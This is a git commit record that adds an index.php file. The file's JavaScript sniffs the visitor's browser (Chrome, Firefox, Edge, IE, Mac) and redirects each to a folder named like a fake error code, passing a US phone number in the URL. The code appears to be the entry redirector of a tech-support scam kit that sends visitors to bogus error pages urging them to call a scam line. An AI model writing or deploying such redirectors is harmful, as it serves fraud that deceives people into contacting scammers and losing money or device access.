b2514559cea9a42dc9870997fac7d68f1315bda5
manavkumar951mkk <manavkumar951mkk@gmail.com>
2022-03-22 19:09:19 +0530

    up

---
+++ index.php
@@ -0,0 +1,35 @@
+<script type="text/javascript">
+var isChromium = window.chrome,
+	vendorName = window.navigator.vendor,
+	isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
+	isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+isEdgeChromium = window.navigator.userAgent.indexOf("dg") > -1;
+
+if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
+	// is Google chrome
+window.location.href = "./SaErr0rJd0800CH010Code88gEng0808/index.html?phone=+1-812-220-0065";
+}
+if(navigator.userAgent.indexOf("Firefox") != -1 )
+	{
+			 window.location.href = "./SaErr0rJd0800FF010Code88gEng0808/index.html?phone=+1-812-220-0065";
+	}
+
+	if(window.navigator.userAgent.indexOf("dg") != -1 )
+		{
+				 window.location.href = "./SaErr0rJd0800ECH010Code88gEng0808/index.html?phone=+1-812-220-0065";
+		}
+
+if(window.navigator.userAgent.indexOf("Edge") != -1 )
+	{
+			 window.location.href = "./SaErr0rJd0800IED010Code88gEng0808/index.html?phone=+1-812-220-0065";
+	}
+if(window.navigator.userAgent.indexOf("Mac") != -1 )
+	{
+			 window.location.href = "./SaErr0rJd0800MA010Code88gEng0808/index.html?phone=+1-812-220-0065";
+	}
+if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
+	{
+		window.location.href = "./SaErr0rJd0800IED010Code88gEng0808/index.html?phone=+1-812-220-0065";
+	}
+$SAFARI_URL = "apple";
+</script>
